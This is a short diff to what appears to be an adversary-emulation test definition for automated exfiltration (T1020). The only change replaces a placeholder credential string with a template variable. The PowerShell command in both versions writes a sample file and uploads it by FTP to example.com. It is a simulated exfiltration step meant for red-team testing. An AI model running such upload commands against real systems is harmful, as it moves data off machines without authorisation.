@@ -12,5 +12,5 @@
     name: psh
     payloads: []
     parsers: []
-    command: $sampleData = "Sample data for exfiltration test"; Set-Content -Path "C:\temp\T1020__FTP_sample.txt" -Value $sampleData; $ftpUrl = "ftp://example.com"; $creds = Get-Credential -Credential "[user:password]"; Invoke-WebRequest -Uri $ftpUrl -Method Put -InFile "C:\temp\T1020__FTP_sample.txt" -Credential $creds
+    command: $sampleData = "Sample data for exfiltration test"; Set-Content -Path "C:\temp\T1020__FTP_sample.txt" -Value $sampleData; $ftpUrl = "ftp://example.com"; $creds = Get-Credential -Credential "#{credentials}"; Invoke-WebRequest -Uri $ftpUrl -Method Put -InFile "C:\temp\T1020__FTP_sample.txt" -Credential $creds
   id: 65ed9764-2fbd-5fb8-839a-39956b6604ca
